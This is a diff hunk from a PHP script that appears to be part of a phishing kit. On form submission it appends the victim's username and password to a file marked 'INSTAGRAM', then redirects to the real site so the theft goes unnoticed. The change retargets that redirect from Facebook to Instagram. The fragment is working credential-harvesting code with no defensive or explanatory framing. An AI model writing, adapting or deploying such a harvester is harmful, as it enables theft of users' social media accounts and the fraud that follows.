@@ -93,6 +93,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-    header("Location: https://www.facebook.com");
+    header("Location: https://www.instagram.com");
 }
 ?>
